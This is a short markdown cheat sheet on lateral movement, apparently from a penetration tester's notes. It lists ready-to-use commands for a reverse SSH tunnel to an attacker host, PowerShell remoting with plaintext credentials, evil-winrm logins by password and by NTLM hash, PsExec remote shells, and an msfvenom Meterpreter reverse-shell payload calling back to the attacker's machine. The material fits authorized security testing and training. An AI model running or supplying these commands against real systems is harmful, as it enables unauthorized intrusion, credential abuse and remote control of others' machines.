# 06 - Lateral Movement

Index
- [SSH Tunneling](#SSH-Tunneling)
- [Windows New-PSSession](#Windows-New-PSSession)
- [Evil-winrm](#Evil-winrm)
- [PsExec64](#PsExec64)

## SSH Tunneling
Fron INTERNAL target to ATTACKER workstation:
``` bash
ssh -N -R 9000 $USER@$KALI
ssh -N -R 9000 sheliak@192.168.1.1
```

## Windows New-PSSession
``` powershell
$username = 'username';
$password = 'password';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
New-PSSession -ComputerName 192.168.1.1 -Credential $credential                                 ## create a session
Enter-PSSession 1                                                                               ## login in session 1
```

## Evil-winrm
Linux tool to access a remote system via WinRM and obtain a shell.
``` bash
evil-winrm -i 192.168.1.1 -u 'username' -p 'password'
evil-winrm -i 192.168.1.1 -u 'username' -H '00000000000000000000000000000000'
```

## PsExec64
``` powershell
./PsExec64.exe -i \\TARGET -u $DIMAIN\$USER -p "$PASSWORD" powershell
./PsExec64.exe -i \\192.168.1.1 -u TEST\username -p "password" powershell
```

## Meterpreter reverse shell (1)
Payload for windows:
``` bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=$KALI LPORT=80 -f exe > reverse.exe
```